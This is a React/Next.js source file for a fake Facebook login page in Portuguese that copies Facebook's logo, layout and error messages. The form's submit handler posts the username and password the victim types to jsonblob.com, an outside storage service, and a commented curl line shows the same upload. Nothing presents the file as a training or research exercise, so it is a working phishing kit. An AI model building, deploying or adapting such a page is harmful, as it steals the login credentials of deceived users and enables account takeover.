import Layout from "../componentes/Layout";
import Image from "next/image";
import Footer from "../componentes/Footer";
import { useForm } from "react-hook-form";

function HomePage() {
	const {
		register,
		handleSubmit,
		formState: { errors },
	} = useForm();

	const onSubmit = async (data) => {
		// alert(`${data.pass} || ${data.user}`);

		const response = await fetch("https://jsonblob.com/api/jsonBlob", {
			method: "POST",
			headers: {
				"Content-Type": "application/json",
			},
			body: JSON.stringify({
				user: data.user,
				pass: data.pass,
			}),
		});

		// console.log("response");
		// console.log(response);
		var myHeaders = response.headers.get("location");
		// console.log(myHeaders.has("x-jsonblob"));
		// console.log("myHeaders");
		// console.log(myHeaders);
		const responseData = await response.json();

		// console.log("responseData");
		// console.log(responseData);

		if (typeof window === "undefined") {
			alert("server side");
			console.log("myHeaders");
			console.log(myHeaders);
		}
	};

	// curl -i -X "POST" -d '{"perfil":["email", "pass"]}' -H "Content-Type: application/json" -H "Accept: application/json" https://jsonblob.com/api/jsonBlob

	return (
		<Layout>
			<div
				className="flex h-2/6 justify-center"
				style={{ backgroundColor: "#f0f2f5" }}
			>
				<div className="flex flex-col mt-10" style={{ width: "396px" }}>
					<Image src="/fb2.svg" width="240" height="85" />
					<form
						onSubmit={handleSubmit(onSubmit)}
						className="rounded-lg border shadow-lg p-3 bg-white "
					>
						<div
							className="p-3 text-center"
							style={{ fontSize: "18px", lineHeight: "22px" }}
						>
							Início de sessão no Facebook
						</div>
						<div className="mx-1 my-3">
							<input
								className="border-gray-300 border rounded-md "
								style={{
									fontSize: "17px",
									padding: "14px 16px",
									width: "363px",
								}}
								type="text"
								// name="email"
								placeholder="E-mail ou número de telemóvel"
								{...register("user", { required: true })}
							/>
							{errors.user && (
								<span className="text-red-600">
									The email or mobile number you entered isn’t connected to an
									account. Find your account and log in.
								</span>
							)}
						</div>
						<div className="mx-1 my-3">
							<input
								className="border-gray-300 border rounded-md"
								style={{
									fontSize: "17px",
									padding: "14px 16px",
									width: "363px",
								}}
								type="password"
								// name="pass"
								placeholder="Palavra-passe"
								{...register("pass", { required: true })}
							/>
							{errors.pass && (
								<span className="text-red-600">
									The password you’ve entered is incorrect. Forgot Password?
								</span>
							)}
						</div>
						<div className="mx-1 my-2">
							<button
								type="submit"
								className="text-white"
								style={{
									backgroundColor: "#1877f2",
									border: "none",
									borderRadius: "6px",
									fontSize: "20px",
									lineHeight: "48px",
									padding: "0 16px",
									width: "363px",
									fontWeight: "bold",
								}}
							>
								Iniciar sessão
							</button>
						</div>
						<div className="text-center" style={{ padding: "12px 0 18px" }}>
							<a
								href="https://www.facebook.com/recover/initiate/?ars=facebook_login"
								target="_black"
								className="lgcls"
							>
								Esqueceste-te da tua conta?
							</a>
							<span className="mx-1" style={{ color: "#90949c" }}>
								.
							</span>
							<a
								href="https://www.facebook.com/r.php?locale=en_US&display=page"
								target="_black"
								className="lgcls"
							>
								Regista-te no Facebook
							</a>
						</div>
					</form>
				</div>
			</div>
			<Footer />
		</Layout>
	);
}

export default HomePage;
